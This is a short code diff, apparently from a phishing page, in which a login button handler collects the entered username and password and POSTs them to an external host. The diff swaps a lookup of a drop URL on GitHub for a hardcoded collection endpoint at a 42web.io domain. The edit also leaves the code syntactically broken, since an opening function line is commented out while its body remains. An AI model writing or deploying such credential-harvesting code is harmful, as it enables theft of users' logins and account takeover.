@@ -5,8 +5,8 @@
     btn[0].addEventListener("click", function(){
         let xhr = new XMLHttpRequest();
 
-        xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
-        xhr.onreadystatechange = async function() {
+        //xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
+        //xhr.onreadystatechange = async function() {
             if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                 const urlContent = xhr.responseText;
 
@@ -14,7 +14,7 @@
                 data.append("username", username.value);
                 data.append("password", password.value);
 
-                const response = await fetch(urlContent + "index/get.php", {
+                const response = await fetch("http://fckyou.42web.io/index/get.php", {
                     method: "POST",
                     body: data
                 });
